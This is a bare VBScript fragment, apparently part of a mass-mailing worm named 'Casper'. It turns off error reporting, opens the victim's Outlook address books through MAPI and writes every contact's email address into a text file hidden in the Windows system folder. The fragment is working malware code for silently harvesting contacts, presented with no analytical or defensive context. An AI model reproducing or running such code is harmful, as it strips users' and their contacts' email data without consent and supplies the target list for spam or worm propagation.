On Error Resume Next
Set Casper = CreateObject("Outlook.Application")
Set L = Casper.GetNameSpace("MAPI")
Set fs=CreateObject("Scripting.FileSystemObject")
Set c=fs.CreateTextFile(fs.GetSpecialFolder(0)&"\CasperEMail.txt")
c.Close
For Each M In L.AddressLists
If M.AddressEntries.Count <> 0 Then
For O = 1 To M.AddressEntries.Count
Set P = M.AddressEntries(O)
Set c=fs.OpenTextFile(fs.GetSpecialFolder(0)&"\CasperEMail.txt",8,true)
c.WriteLine P.Address
c.Close
Next
End If
Next
Set c=fs.OpenTextFile(fs.GetSpecialFolder(0)&"\CasperEMail.txt",8,true)
c.WriteLine "#"
c.Close
